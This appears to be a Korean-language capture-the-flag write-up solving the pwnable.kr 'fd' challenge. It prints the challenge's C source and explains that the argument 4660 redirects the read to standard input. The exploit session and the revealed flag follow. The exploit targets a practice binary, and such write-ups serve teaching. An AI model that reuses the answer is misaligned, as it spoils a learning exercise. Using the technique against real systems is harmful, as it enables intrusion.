# [pwnable.kr] fd

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Mommy! what is a file descriptor in Linux?
>
> * try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
> https://youtu.be/971eZhMHQQw
>
> ssh fd@pwnable.kr -p2222 (pw:guest)
>
> Release: [fd.zip](https://github.com/h0meb0dy/pwnable.kr/files/9079375/fd.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/178152110-23f5443f-caf2-4d29-b70c-451fcfa810f8.png)

## Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

`fd`를 `0`으로 만들면 `buf`에 32바이트까지 문자열을 입력할 수 있다.

## Exploit

`argv[1]`에 `4660`(`0x1234`)을 입력하면 `fd`가 `0`이 된다. `buf`에 `"LETMEWIN\n"`을 입력하면 플래그를 획득할 수 있다.

```c
fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```